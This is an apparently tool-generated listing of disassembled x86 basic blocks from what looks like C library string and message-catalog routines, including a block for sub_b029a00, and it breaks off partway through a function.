0xb0296d5:	lea	edx, dword ptr [ebx + 0x10e0]
0xb0296db:	mov	eax, dword ptr [ebx + 0x38a8]
0xb0296e1:	mov	dword ptr [esp], edx
0xb0296e4:	ror	eax, 9
0xb0296e7:	xor	eax, dword ptr gs:[0x18]
0xb0296ee:	call	eax
None
|
|
|
v
0xb02986b:	mov	eax, dword ptr [ebp - 0x4c]
0xb02986e:	mov	dword ptr [ebp - 0x50], ecx
0xb029871:	mov	dword ptr [esp], eax
0xb029874:	call	0xb017470
None
|
|
|
v
0xb0293de:	mov	eax, dword ptr [ebp - 0x4c]
0xb0293e1:	mov	dword ptr [esp + 4], 0x2f
0xb0293e9:	mov	dword ptr [esp], eax
0xb0293ec:	call	0xb07a520
None
|
|
|
v
0xb02972f:	mov	eax, dword ptr [ebp + 0xc]
0xb029732:	mov	dword ptr [ebp - 0x4c], ecx
0xb029735:	mov	dword ptr [esp], eax
0xb029738:	call	0xb07ae80
None
|
|
|
v
0xb029406:	mov	esi, dword ptr [ebp - 0x4c]
0xb029409:	mov	ecx, 6
0xb02940e:	lea	edi, dword ptr [ebx - 0x4aa44]
0xb029414:	repe cmpsb	byte ptr [esi], byte ptr es:[edi]
None
|
|
|
v
0xb0295fe:	lea	edx, dword ptr [ebx + 0x1120]
0xb029604:	mov	eax, dword ptr [ebx + 0x38a0]
0xb02960a:	mov	dword ptr [esp], edx
0xb02960d:	ror	eax, 9
0xb029610:	xor	eax, dword ptr gs:[0x18]
0xb029617:	call	eax
None
|
|
|
v
0xb02949b:	mov	esi, dword ptr [ebx - 0xdc]
0xb0294a1:	mov	eax, dword ptr [ebp - 0x68]
0xb0294a4:	mov	edx, dword ptr [ebp - 0x6c]
0xb0294a7:	mov	dword ptr [eax + esi], edx
0xb0294aa:	mov	esi, dword ptr [ebp + 0x14]
0xb0294ad:	test	esi, esi
0xb0294af:	jne	0xb02970e
None
|
|
|
v
0xb0291ee:	mov	edi, dword ptr [ebp + 8]
0xb0291f1:	jmp	0xb029208
None
|
|
|
v
0xb029619:	jmp	0xb029174
None
|
|
|
v
0xb0294ea:	lea	edx, dword ptr [ebx + 0x10e0]
0xb0294f0:	mov	eax, dword ptr [ebx + 0x38a8]
0xb0294f6:	mov	dword ptr [esp], edx
0xb0294f9:	ror	eax, 9
0xb0294fc:	xor	eax, dword ptr gs:[0x18]
0xb029503:	call	eax
None
|
|
|
v
0xb0292e7:	test	eax, eax
0xb0292e9:	mov	esi, eax
0xb0292eb:	je	0xb0295cb
None
|
|
|
v
0xb029258:	mov	eax, esi
0xb02925a:	shr	eax, 1
0xb02925c:	lea	esi, dword ptr [esi + eax + 0x20]
0xb029260:	mov	eax, dword ptr [ebp - 0x4c]
0xb029263:	mov	ecx, 0x10
0xb029268:	xor	edx, edx
0xb02926a:	lea	eax, dword ptr [esi + eax + 0x1e]
0xb02926e:	div	ecx
0xb029270:	mov	edx, dword ptr [ebx - 0xdc]
0xb029276:	mov	dword ptr [edi + edx], 0
0xb02927d:	shl	eax, 4
0xb029280:	sub	esp, eax
0xb029282:	lea	eax, dword ptr [esp + 0x1b]
0xb029286:	and	eax, 0xfffffff0
0xb029289:	mov	dword ptr [esp + 4], esi
0xb02928d:	mov	dword ptr [esp], eax
0xb029290:	mov	dword ptr [ebp - 0x5c], eax
0xb029293:	call	0xb0dbb60
None
|
|
|
v
0xb0292f1:	cmp	byte ptr [eax], 0
0xb0292f4:	je	0xb0295cb
None
|
|
|
v
0xb02961e:	lea	edx, dword ptr [ebx + 0xfe0]
0xb029624:	mov	eax, dword ptr [ebx + 0x38a0]
0xb02962a:	mov	dword ptr [esp], edx
0xb02962d:	ror	eax, 9
0xb029630:	xor	eax, dword ptr gs:[0x18]
0xb029637:	call	eax
None
|
|
|
v
0xb029470:	mov	eax, dword ptr [ebp - 0x64]
0xb029473:	test	eax, eax
0xb029475:	je	0xb02972f
None
|
|
|
v
0xb02913e:	lea	edx, dword ptr [eax + 1]
0xb029141:	add	eax, 0x1f
0xb029144:	and	eax, 0xfffffff0
0xb029147:	sub	esp, eax
0xb029149:	lea	eax, dword ptr [esp + 0x1b]
0xb02914d:	and	eax, 0xfffffff0
0xb029150:	mov	dword ptr [esp + 8], edx
0xb029154:	mov	dword ptr [esp + 4], esi
0xb029158:	mov	dword ptr [esp], eax
0xb02915b:	call	0xb07d0b0
None
|
|
|
v
0xb0290e9:	cmp	dword ptr [ebp + 0x1c], 6
0xb0290ed:	je	0xb02953c
None
|
|
|
v
0xb029398:	mov	eax, dword ptr [ebp - 0x50]
0xb02939b:	movzx	eax, byte ptr [eax]
0xb02939e:	cmp	al, 0x3a
0xb0293a0:	je	0xb029568
None
|
|
|
v
0xb029305:	cmp	byte ptr [eax], 0x43
0xb029308:	mov	dword ptr [ebp - 0x50], eax
0xb02930b:	jne	0xb029317
None
|
|
|
v
0xb029578:	mov	eax, dword ptr [edi + 0x10]
0xb02957b:	test	eax, eax
0xb02957d:	je	0xb029398
None
|
|
|
v
0xb029588:	add	esi, 1
0xb02958b:	mov	eax, dword ptr [edi + esi*4 + 0x10]
0xb02958f:	test	eax, eax
0xb029591:	je	0xb029398
None
|
|
|
v
0xb029597:	mov	ecx, dword ptr [ebp - 0x58]
0xb02959a:	mov	edx, dword ptr [ebp - 0x54]
0xb02959d:	mov	dword ptr [esp], 1
0xb0295a4:	mov	dword ptr [esp + 4], ecx
0xb0295a8:	mov	ecx, dword ptr [ebp + 0xc]
0xb0295ab:	call	0xb028660
None
|
|
|
v
0xb029512:	mov	eax, dword ptr [ebp - 0x4c]
0xb029515:	cmp	byte ptr [eax + 1], 0
0xb029519:	jne	0xb029406
None
|
|
|
v
0xb0298bf:	mov	ecx, dword ptr [ebp - 0x50]
0xb0298c2:	jmp	0xb029831
None
|
|
|
v
0xb0295cb:	mov	eax, dword ptr [ebp + 0x1c]
0xb0295ce:	mov	dword ptr [esp], eax
0xb0295d1:	call	0xb027640
None
|
|
|
v
0xb02930d:	mov	eax, dword ptr [ebp - 0x50]
0xb029310:	cmp	byte ptr [eax + 1], 0
0xb029314:	cmove	esi, eax
0xb029317:	mov	dword ptr [ebp - 0x50], esi
0xb02931a:	mov	eax, dword ptr [ebp + 8]
0xb02931d:	mov	dword ptr [esp], eax
0xb029320:	call	0xb07ae80
None
|
|
|
v
0xb029749:	mov	edx, dword ptr [esi]
0xb02974b:	add	esi, 4
0xb02974e:	lea	eax, dword ptr [edx - 0x1010101]
0xb029754:	not	edx
0xb029756:	and	eax, edx
0xb029758:	and	eax, 0x80808080
0xb02975d:	je	0xb029749
None
|
|
|
v
0xb029317:	mov	dword ptr [ebp - 0x50], esi
0xb02931a:	mov	eax, dword ptr [ebp + 8]
0xb02931d:	mov	dword ptr [esp], eax
0xb029320:	call	0xb07ae80
None
|
|
|
v
0xb02971e:	sub	esp, 4
0xb029721:	mov	ecx, eax
0xb029723:	jmp	0xb0294b5
None
|
|
|
v
0xb029558:	mov	esi, dword ptr [ebp + 0xc]
0xb02955b:	lea	esp, dword ptr [ebp - 0xc]
0xb02955e:	pop	ebx
0xb02955f:	mov	eax, esi
0xb029561:	pop	esi
0xb029562:	pop	edi
0xb029563:	pop	ebp
0xb029564:	ret	
None
|
|
|
v
0xb029332:	lea	eax, dword ptr [esi + eax + 0x23]
0xb029336:	and	eax, 0xfffffff0
0xb029339:	sub	esp, eax
0xb02933b:	lea	eax, dword ptr [esp + 0x1b]
0xb02933f:	and	eax, 0xfffffff0
0xb029342:	mov	dword ptr [esp + 4], edi
0xb029346:	mov	dword ptr [esp], eax
0xb029349:	mov	dword ptr [ebp - 0x60], eax
0xb02934c:	call	0xb07cd00
None
|
|
|
v
0xb02978f:	mov	ecx, dword ptr [ebp - 0x54]
0xb029792:	test	eax, eax
0xb029794:	mov	dword ptr [ebp - 0x4c], eax
0xb029797:	je	0xb02949b
None
|
|
|
v
0xb029662:	jmp	0xb029101
None
|
|
|
v
0xb029248:	mov	eax, dword ptr [ebx - 0xdc]
0xb02924e:	cmp	dword ptr [edi + eax], 0x22
0xb029252:	jne	0xb02951f
None
|
|
|
v
0xb029568:	add	dword ptr [ebp - 0x50], 1
0xb02956c:	jmp	0xb029398
None
|
|
|
v
0xb029134:	mov	dword ptr [esp], eax
0xb029137:	mov	esi, eax
0xb029139:	call	0xb07ae80
None
|
|
|
v
0xb0296a7:	jmp	0xb0294c5
None
|
|
|
v
0xb0292fa:	mov	eax, dword ptr [ebp + 0x1c]
0xb0292fd:	mov	dword ptr [esp], eax
0xb029300:	call	0xb027640
None
|
|
|
v
0xb0294e0:	mov	eax, dword ptr [ebx + 0x38d8]
0xb0294e6:	test	eax, eax
0xb0294e8:	je	0xb02954c
None
|
|
|
v
0xb029709:	sub	esp, 4
0xb02970c:	jmp	0xb029697
None
|
|
|
v
0xb029879:	mov	ecx, dword ptr [ebp - 0x50]
0xb02987c:	jmp	0xb02949b
None
|
|
|
v
0xb0292b5:	mov	byte ptr [eax], 0x2f
0xb0292b8:	add	eax, 1
0xb0292bb:	mov	dword ptr [esp + 4], esi
0xb0292bf:	mov	dword ptr [esp], eax
0xb0292c2:	call	0xb07a810
None
|
|
|
v
0xb0296c7:	mov	eax, dword ptr [ebx + 0x38d8]
0xb0296cd:	test	eax, eax
0xb0296cf:	je	0xb02952d
None
|
|
|
v
0xb0293a6:	test	al, al
0xb0293a8:	je	0xb029508
None
|
|
|
v
0xb02975f:	mov	edx, eax
0xb029761:	shr	edx, 0x10
0xb029764:	test	eax, 0x8080
0xb029769:	cmove	eax, edx
0xb02976c:	lea	edx, dword ptr [esi + 2]
0xb02976f:	cmove	esi, edx
0xb029772:	add	al, al
0xb029774:	mov	eax, dword ptr [ebp - 0x7c]
0xb029777:	sbb	esi, 3
0xb02977a:	sub	esi, dword ptr [ebp - 0x70]
0xb02977d:	mov	dword ptr [ebp - 0x54], ecx
0xb029780:	lea	eax, dword ptr [esi + eax + 0x1e]
0xb029784:	add	eax, dword ptr [ebp - 0x50]
0xb029787:	mov	dword ptr [esp], eax
0xb02978a:	call	0xb0173f0
None
|
|
|
v
0xb0290f3:	mov	eax, dword ptr [ebx + 0x38d8]
0xb0290f9:	test	eax, eax
0xb0290fb:	jne	0xb02961e
None
|
|
|
v
0xb02931a:	mov	eax, dword ptr [ebp + 8]
0xb02931d:	mov	dword ptr [esp], eax
0xb029320:	call	0xb07ae80
None
|
|
|
v
0xb0290df:	cmp	dword ptr [ebp + 0x1c], 0xc
0xb0290e3:	ja	0xb02953c
None
|
|
|
v
0xb02952d:	mov	eax, dword ptr [ebp - 0x68]
0xb029530:	mov	edi, dword ptr [ebx - 0xdc]
0xb029536:	mov	esi, dword ptr [ebp - 0x6c]
0xb029539:	mov	dword ptr [eax + edi], esi
0xb02953c:	mov	eax, dword ptr [ebp + 0x14]
0xb02953f:	test	eax, eax
0xb029541:	je	0xb029558
None
|
|
|
v
0xb0295bc:	test	eax, eax
0xb0295be:	je	0xb029588
None
|
|
|
v
0xb029508:	mov	eax, dword ptr [ebp - 0x4c]
0xb02950b:	mov	byte ptr [eax], 0x43
0xb02950e:	mov	byte ptr [eax + 1], 0
0xb029512:	mov	eax, dword ptr [ebp - 0x4c]
0xb029515:	cmp	byte ptr [eax + 1], 0
0xb029519:	jne	0xb029406
None
|
|
|
v
0xb0296ac:	lea	edx, dword ptr [ebx + 0xfe0]
0xb0296b2:	mov	eax, dword ptr [ebx + 0x38a8]
0xb0296b8:	mov	dword ptr [esp], edx
0xb0296bb:	ror	eax, 9
0xb0296be:	xor	eax, dword ptr gs:[0x18]
0xb0296c5:	call	eax
None
|
|
|
v
0xb0291f8:	js	0xb029678
None
|
|
|
v
0xb029351:	mov	edi, dword ptr [ebp + 8]
0xb029354:	mov	edx, 0x2f
0xb029359:	mov	word ptr [eax], dx
0xb02935c:	add	eax, 1
0xb02935f:	mov	dword ptr [esp + 8], esi
0xb029363:	mov	dword ptr [esp + 4], edi
0xb029367:	mov	dword ptr [esp], eax
0xb02936a:	call	0xb07cad0
None
|
|
|
v
0xb029325:	mov	dword ptr [esp], edi
0xb029328:	mov	esi, eax
0xb02932a:	mov	dword ptr [ebp - 0x7c], eax
0xb02932d:	call	0xb07ae80
None
|
|
|
v
0xb029697:	mov	edi, dword ptr [ebx + 0x38d8]
0xb02969d:	mov	esi, eax
0xb02969f:	test	edi, edi
0xb0296a1:	je	0xb02954c
None
|
|
|
v
0xb029505:	jmp	0xb02954c
None
|
|
|
v
0xb02941c:	mov	esi, dword ptr [ebp - 0x54]
0xb02941f:	mov	ecx, dword ptr [ebp - 0x60]
0xb029422:	mov	edx, dword ptr [ebp - 0x4c]
0xb029425:	mov	eax, dword ptr [ebp - 0x5c]
0xb029428:	mov	dword ptr [esp], esi
0xb02942b:	call	0xb029a00
None
|
|
|
v
0xb0295de:	lea	edx, dword ptr [ebx + 0x1120]
0xb0295e4:	mov	eax, dword ptr [ebx + 0x38a8]
0xb0295ea:	mov	dword ptr [esp], edx
0xb0295ed:	ror	eax, 9
0xb0295f0:	xor	eax, dword ptr gs:[0x18]
0xb0295f7:	call	eax
None
|
|
|
v
0xb0291c4:	mov	eax, dword ptr gs:[0]
0xb0291ca:	mov	edi, dword ptr [ebx - 0xdc]
0xb0291d0:	mov	dword ptr [ebp - 0x68], eax
0xb0291d3:	mov	eax, dword ptr [eax + edi]
0xb0291d6:	mov	dword ptr [ebp - 0x6c], eax
0xb0291d9:	mov	eax, dword ptr [ebx - 0x98]
0xb0291df:	mov	eax, dword ptr [eax]
0xb0291e1:	test	eax, eax
0xb0291e3:	mov	esi, eax
0xb0291e5:	mov	dword ptr [ebp - 0x54], eax
0xb0291e8:	je	0xb02966a
None
|
|
|
v
0xb0291b1:	mov	edx, dword ptr [eax]
0xb0291b3:	mov	eax, dword ptr [ebx - 0x94]
0xb0291b9:	mov	eax, dword ptr [eax]
0xb0291bb:	cmp	dword ptr [edx + 0xc], eax
0xb0291be:	je	0xb02968d
None
|
|
|
v
0xb0293bc:	add	edx, 1
0xb0293bf:	add	ecx, 1
0xb0293c2:	mov	byte ptr [edx - 1], al
0xb0293c5:	movzx	eax, byte ptr [ecx]
0xb0293c8:	cmp	al, 0x3a
0xb0293ca:	jne	0xb0293b8
None
|
|
|
v
0xb029881:	lea	eax, dword ptr [ebx + 0x1120]
0xb029887:	mov	edx, dword ptr [ebx + 0x38a8]
0xb02988d:	mov	dword ptr [esp], eax
0xb029890:	ror	edx, 9
0xb029893:	xor	edx, dword ptr gs:[0x18]
0xb02989a:	call	edx
None
|
|
|
v
0xb02923d:	lea	edi, dword ptr [eax + 1]
0xb029240:	mov	dword ptr [ebp - 0x4c], edi
0xb029243:	mov	edi, dword ptr [ebp - 0x68]
0xb029246:	jmp	0xb029260
None
|
|
|
v
0xb0295c0:	mov	ecx, eax
0xb0295c2:	mov	edi, dword ptr [edi + esi*4 + 0x10]
0xb0295c6:	jmp	0xb029470
None
|
|
|
v
0xb029728:	xor	esi, esi
0xb02972a:	jmp	0xb02954c
None
|
|
|
v
0xb029414:	repe cmpsb	byte ptr [esi], byte ptr es:[edi]
None
|
|
|
v
0xb02953c:	mov	eax, dword ptr [ebp + 0x14]
0xb02953f:	test	eax, eax
0xb029541:	je	0xb029558
None
|
|
|
v
0xb02936f:	mov	dword ptr [eax], 0x6f6d2e
0xb029375:	mov	eax, dword ptr [ebp - 0x50]
0xb029378:	mov	dword ptr [esp], eax
0xb02937b:	call	0xb07ae80
None
|
|
|
v
0xb0290d1:	add	ebx, 0x181f2f
0xb0290d7:	test	edx, edx
0xb0290d9:	je	0xb029728
None
|
|
|
v
0xb02951f:	mov	ecx, dword ptr [ebx + 0x38d8]
0xb029525:	test	ecx, ecx
0xb029527:	jne	0xb0296ac
None
|
|
|
v
0xb0295b0:	sub	esp, 8
0xb0295b3:	cmp	eax, 0xff
0xb0295b6:	je	0xb02951f
None
|
|
|
v
0xb029217:	test	eax, eax
0xb029219:	jne	0xb0291f8
None
|
|
|
v
0xb0292c7:	mov	eax, dword ptr [ebp + 0x1c]
0xb0292ca:	movzx	eax, byte ptr [ebx + eax - 0x61073]
0xb0292d2:	lea	edi, dword ptr [ebx + eax - 0x61060]
0xb0292d9:	lea	eax, dword ptr [ebx - 0x4a985]
0xb0292df:	mov	dword ptr [esp], eax
0xb0292e2:	call	0xb032860
None
|
|
|
v
0xb029647:	lea	edx, dword ptr [ebx + 0x10e0]
0xb02964d:	mov	eax, dword ptr [ebx + 0x38a0]
0xb029653:	mov	dword ptr [esp], edx
0xb029656:	ror	eax, 9
0xb029659:	xor	eax, dword ptr gs:[0x18]
0xb029660:	call	eax
None
|
|
|
v
0xb02984d:	mov	ecx, dword ptr [ebp - 0x50]
0xb029850:	mov	esi, eax
0xb029852:	mov	eax, dword ptr [ebx + 0x38d8]
0xb029858:	test	eax, eax
0xb02985a:	jne	0xb029881
None
|
|
|
v
0xb029298:	test	eax, eax
0xb02929a:	je	0xb029248
None
|
|
|
v
0xb0293cc:	mov	eax, dword ptr [ebx - 0x100]
0xb0293d2:	mov	dword ptr [ebp - 0x50], ecx
0xb0293d5:	mov	byte ptr [edx], 0
0xb0293d8:	mov	eax, dword ptr [eax]
0xb0293da:	test	eax, eax
0xb0293dc:	je	0xb0293f8
None
|
|
|
v
0xb02973d:	mov	esi, dword ptr [ebp - 0x70]
0xb029740:	mov	ecx, dword ptr [ebp - 0x4c]
0xb029743:	add	eax, 1
0xb029746:	mov	dword ptr [ebp - 0x50], eax
0xb029749:	mov	edx, dword ptr [esi]
0xb02974b:	add	esi, 4
0xb02974e:	lea	eax, dword ptr [edx - 0x1010101]
0xb029754:	not	edx
0xb029756:	and	eax, edx
0xb029758:	and	eax, 0x80808080
0xb02975d:	je	0xb029749
None
|
|
|
v
0xb029174:	lea	eax, dword ptr [ebx - 0x182a30]
0xb02917a:	mov	dword ptr [ebp - 0x74], eax
0xb02917d:	mov	dword ptr [esp + 8], eax
0xb029181:	lea	eax, dword ptr [ebx + 0x1144]
0xb029187:	mov	dword ptr [ebp - 0x78], eax
0xb02918a:	mov	dword ptr [esp + 4], eax
0xb02918e:	lea	eax, dword ptr [ebp - 0x38]
0xb029191:	mov	dword ptr [esp], eax
0xb029194:	call	0xb0e7ee0
None
|
|
|
v
0xb029430:	sub	esp, 4
0xb029433:	test	eax, eax
0xb029435:	mov	edi, eax
0xb029437:	je	0xb029398
None
|
|
|
v
0xb02989c:	mov	ecx, dword ptr [ebp - 0x50]
0xb02989f:	jmp	0xb02985c
None
|
|
|
v
0xb029465:	cmp	eax, 0xff
0xb029468:	mov	ecx, eax
0xb02946a:	je	0xb02951f
None
|
|
|
v
0xb0298a1:	lea	edx, dword ptr [ebx + 0x1120]
0xb0298a7:	mov	eax, dword ptr [ebx + 0x38a4]
0xb0298ad:	mov	dword ptr [ebp - 0x50], ecx
0xb0298b0:	ror	eax, 9
0xb0298b3:	xor	eax, dword ptr gs:[0x18]
0xb0298ba:	mov	dword ptr [esp], edx
0xb0298bd:	call	eax
None
|
|
|
v
0xb029260:	mov	eax, dword ptr [ebp - 0x4c]
0xb029263:	mov	ecx, 0x10
0xb029268:	xor	edx, edx
0xb02926a:	lea	eax, dword ptr [esi + eax + 0x1e]
0xb02926e:	div	ecx
0xb029270:	mov	edx, dword ptr [ebx - 0xdc]
0xb029276:	mov	dword ptr [edi + edx], 0
0xb02927d:	shl	eax, 4
0xb029280:	sub	esp, eax
0xb029282:	lea	eax, dword ptr [esp + 0x1b]
0xb029286:	and	eax, 0xfffffff0
0xb029289:	mov	dword ptr [esp + 4], esi
0xb02928d:	mov	dword ptr [esp], eax
0xb029290:	mov	dword ptr [ebp - 0x5c], eax
0xb029293:	call	0xb0dbb60
None
|
|
|
v
0xb0293b8:	test	al, al
0xb0293ba:	je	0xb0293cc
None
|
|
|
v
0xb02968d:	mov	eax, dword ptr [ebp + 0x14]
0xb029690:	test	eax, eax
0xb029692:	jne	0xb0296f5
None
|
|
|
v
0xb0293f1:	test	eax, eax
0xb0293f3:	jne	0xb029398
None
|
|
|
v
0xb02985c:	test	esi, esi
0xb02985e:	je	0xb02986b
None
|
|
|
v
0xb0297db:	mov	edx, dword ptr [ebp - 0x54]
0xb0297de:	mov	ecx, dword ptr [ebp - 0x70]
0xb0297e1:	add	edx, dword ptr [ebp - 0x50]
0xb0297e4:	mov	dword ptr [esp + 8], esi
0xb0297e8:	mov	dword ptr [esp + 4], ecx
0xb0297ec:	mov	dword ptr [esp], edx
0xb0297ef:	mov	dword ptr [ebp - 0x54], edx
0xb0297f2:	call	0xb07d0b0
None
|
|
|
v
0xb0291aa:	mov	eax, dword ptr [ebp - 0x64]
0xb0291ad:	test	eax, eax
0xb0291af:	je	0xb0291c4
None
|
|
|
v
0xb02922d:	mov	eax, dword ptr [ebp - 0x5c]
0xb029230:	mov	esi, 0x1002
0xb029235:	mov	dword ptr [esp], eax
0xb029238:	call	0xb07ae80
None
|
|
|
v
0xb0293f5:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb02966a:	lea	eax, dword ptr [ebx - 0x4a97c]
0xb029670:	mov	dword ptr [ebp - 0x5c], eax
0xb029673:	jmp	0xb0292c7
None
|
|
|
v
0xb029694:	mov	eax, dword ptr [edx + 0x14]
0xb029697:	mov	edi, dword ptr [ebx + 0x38d8]
0xb02969d:	mov	esi, eax
0xb02969f:	test	edi, edi
0xb0296a1:	je	0xb02954c
None
|
|
|
v
0xb02954c:	lea	esp, dword ptr [ebp - 0xc]
0xb02954f:	mov	eax, esi
0xb029551:	pop	ebx
0xb029552:	pop	esi
0xb029553:	pop	edi
0xb029554:	pop	ebp
0xb029555:	ret	
None
|
|
|
v
0xb029678:	lea	eax, dword ptr [ebx - 0x4a97c]
0xb02967e:	mov	dword ptr [ebp - 0x54], 0
0xb029685:	mov	dword ptr [ebp - 0x5c], eax
0xb029688:	jmp	0xb0292c7
None
|
|
|
v
0xb0297bc:	mov	edx, dword ptr [ebp - 0x7c]
0xb0297bf:	add	edx, 1
0xb0297c2:	mov	dword ptr [esp + 8], edx
0xb0297c6:	mov	dword ptr [ebp - 0x54], edx
0xb0297c9:	mov	edx, dword ptr [ebp + 8]
0xb0297cc:	mov	dword ptr [esp], eax
0xb0297cf:	mov	dword ptr [ebp - 0x50], eax
0xb0297d2:	mov	dword ptr [esp + 4], edx
0xb0297d6:	call	0xb07d0b0
None
|
|
|
v
0xb02929c:	mov	eax, dword ptr [ebp - 0x54]
0xb02929f:	mov	esi, dword ptr [eax + 4]
0xb0292a2:	mov	eax, dword ptr [ebp - 0x5c]
0xb0292a5:	mov	dword ptr [esp + 4], 0
0xb0292ad:	mov	dword ptr [esp], eax
0xb0292b0:	call	0xb07ed60
None
|
|
|
v
0xb02921b:	mov	eax, dword ptr [esi + 4]
0xb02921e:	mov	dword ptr [ebp - 0x54], esi
0xb029221:	cmp	byte ptr [eax], 0x2f
0xb029224:	mov	dword ptr [ebp - 0x5c], eax
0xb029227:	je	0xb0292c7
None
|
|
|
v
0xb0290c0:	push	ebp
0xb0290c1:	mov	ebp, esp
0xb0290c3:	push	edi
0xb0290c4:	push	esi
0xb0290c5:	push	ebx
0xb0290c6:	sub	esp, 0x7c
0xb0290c9:	mov	edx, dword ptr [ebp + 0xc]
0xb0290cc:	call	0xb1267db
None
|
|
|
v
0xb029639:	mov	eax, dword ptr [ebx + 0x38d8]
0xb02963f:	test	eax, eax
0xb029641:	je	0xb029101
None
|
|
|
v
0xb029543:	cmp	dword ptr [ebp + 0x18], 1
0xb029547:	je	0xb029558
None
|
|
|
v
0xb029583:	xor	esi, esi
0xb029585:	jmp	0xb029597
None
|
|
|
v
0xb0291fe:	mov	esi, dword ptr [esi]
0xb029200:	test	esi, esi
0xb029202:	je	0xb029667
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b029a00
TOTAL BLOCKS :56
0xb029bea:	mov	dword ptr [esp], esi
0xb029bed:	call	0xb07ae80
None
|
|
|
v
0xb029c4a:	test	ecx, ecx
0xb029c4c:	je	0xb029c60
None
|
|
|
v
0xb029ba6:	lea	eax, dword ptr [ebp - 0x1c]
0xb029ba9:	mov	dword ptr [esp + 0x14], eax
0xb029bad:	lea	eax, dword ptr [ebp - 0x20]
0xb029bb0:	mov	dword ptr [esp + 0x10], eax
0xb029bb4:	lea	eax, dword ptr [ebp - 0x24]
0xb029bb7:	mov	dword ptr [esp + 0xc], eax
0xb029bbb:	lea	eax, dword ptr [ebp - 0x28]
0xb029bbe:	mov	dword ptr [esp + 8], eax
0xb029bc2:	lea	eax, dword ptr [ebp - 0x2c]
0xb029bc5:	mov	dword ptr [esp], edi
0xb029bc8:	mov	dword ptr [esp + 4], eax
0xb029bcc:	call	0xb02c2a0
None
|
|
|
v
0xb029a94:	test	ecx, ecx
0xb029a96:	je	0xb029b68
None
|
|
|
v
0xb029b40:	lea	esp, dword ptr [ebp - 0xc]
0xb029b43:	mov	eax, edi
0xb029b45:	pop	ebx
0xb029b46:	pop	esi
0xb029b47:	pop	edi
0xb029b48:	pop	ebp
0xb029b49:	ret	4
None
|
|
|
v
0xb029b0f:	mov	eax, edi
0xb029b11:	mov	esi, ecx
0xb029b13:	mov	edi, ecx
0xb029b15:	jmp	0xb029b2c
None
|
|
|
v
0xb029bdc:	mov	eax, dword ptr [ebx + 0x38d8]
0xb029be2:	test	eax, eax
0xb029be4:	jne	0xb029ca7
None
|
|
|
v
0xb029afe:	mov	ecx, dword ptr [ebp - 0x44]
0xb029b01:	jmp	0xb029a94
None
|
|
|
v
0xb029a31:	mov	edx, dword ptr [ebp - 0x3c]
0xb029a34:	mov	dword ptr [esp + 0x28], 0
0xb029a3c:	mov	dword ptr [esp + 0x20], 0
0xb029a44:	mov	dword ptr [esp + 0x1c], 0
0xb029a4c:	mov	dword ptr [esp + 0x24], edx
0xb029a50:	mov	dword ptr [esp + 0x18], 0
0xb029a58:	add	eax, 1
0xb029a5b:	mov	dword ptr [esp + 8], eax
0xb029a5f:	lea	eax, dword ptr [ebx + 0x1180]
0xb029a65:	mov	dword ptr [esp + 0x14], 0
0xb029a6d:	mov	dword ptr [esp + 0x10], edi
0xb029a71:	mov	dword ptr [esp + 0xc], 0
0xb029a79:	mov	dword ptr [esp + 4], esi
0xb029a7d:	mov	dword ptr [esp], eax
0xb029a80:	mov	dword ptr [ebp - 0x40], eax
0xb029a83:	call	0xb02bc20
None
|
|
|
v
0xb029d12:	mov	ecx, dword ptr [ebp - 0x3c]
0xb029d15:	jmp	0xb029c60
None
|
|
|
v
0xb029ce2:	add	esi, 4
0xb029ce5:	mov	eax, dword ptr [esi + 0x10]
0xb029ce8:	test	eax, eax
0xb029cea:	je	0xb029d12
None
|
|
|
v
0xb029a0f:	add	ebx, 0x1815f1
0xb029a15:	sub	esp, 0x6c
0xb029a18:	mov	dword ptr [ebp - 0x3c], ecx
0xb029a1b:	mov	eax, dword ptr [ebx + 0x38d8]
0xb029a21:	test	eax, eax
0xb029a23:	jne	0xb029ac0
None
|
|
|
v
0xb029bf2:	mov	edx, dword ptr [ebp - 0x3c]
0xb029bf5:	mov	dword ptr [esp + 0x28], 1
0xb029bfd:	mov	dword ptr [esp + 0xc], edi
0xb029c01:	mov	dword ptr [esp + 4], esi
0xb029c05:	mov	dword ptr [esp + 0x24], edx
0xb029c09:	mov	edx, dword ptr [ebp - 0x28]
0xb029c0c:	add	eax, 1
0xb029c0f:	mov	dword ptr [esp + 8], eax
0xb029c13:	mov	eax, dword ptr [ebp - 0x40]
0xb029c16:	mov	dword ptr [esp + 0x20], edx
0xb029c1a:	mov	edx, dword ptr [ebp - 0x1c]
0xb029c1d:	mov	dword ptr [esp], eax
0xb029c20:	mov	dword ptr [esp + 0x1c], edx
0xb029c24:	mov	edx, dword ptr [ebp - 0x20]
0xb029c27:	mov	dword ptr [esp + 0x18], edx
0xb029c2b:	mov	edx, dword ptr [ebp - 0x24]
0xb029c2e:	mov	dword ptr [esp + 0x14], edx
0xb029c32:	mov	edx, dword ptr [ebp - 0x2c]
0xb029c35:	mov	dword ptr [esp + 0x10], edx
0xb029c39:	call	0xb02bc20
None
|
|
|
v
0xb029b33:	mov	edx, dword ptr [ebp + 8]
0xb029b36:	call	0xb029d30
None
|
|
|
v
0xb029c3e:	mov	ecx, eax
0xb029c40:	mov	eax, dword ptr [ebx + 0x38d8]
0xb029c46:	test	eax, eax
0xb029c48:	jne	0xb029c84
None
|
|
|
v
0xb029c6c:	mov	eax, dword ptr [ebp - 0x1c]
0xb029c6f:	mov	dword ptr [ebp - 0x3c], ecx
0xb029c72:	mov	dword ptr [esp], eax
0xb029c75:	call	0xb017470
None
|
|
|
v
0xb029a00:	push	ebp
0xb029a01:	mov	ebp, esp
0xb029a03:	push	edi
0xb029a04:	mov	edi, edx
0xb029a06:	push	esi
0xb029a07:	mov	esi, eax
0xb029a09:	push	ebx
0xb029a0a:	call	0xb1267db
None
|
|
|
v
0xb029b70:	test	eax, eax
0xb029b72:	je	0xb029ba6
None
|
|
|
v
0xb029a29:	mov	dword ptr [esp], esi
0xb029a2c:	call	0xb07ae80
None
|
|
|
v
0xb029b7f:	mov	edx, dword ptr [ebp - 0x44]
0xb029b82:	lea	ecx, dword ptr [eax + 1]
0xb029b85:	add	eax, 0x1f
0xb029b88:	and	eax, 0xfffffff0
0xb029b8b:	sub	esp, eax
0xb029b8d:	lea	eax, dword ptr [esp + 0x3b]
0xb029b91:	and	eax, 0xfffffff0
0xb029b94:	mov	dword ptr [esp + 8], ecx
0xb029b98:	mov	dword ptr [esp + 4], edx
0xb029b9c:	mov	dword ptr [esp], eax
0xb029b9f:	call	0xb07d0b0
None
|
|
|
v
0xb029cce:	mov	esi, ecx
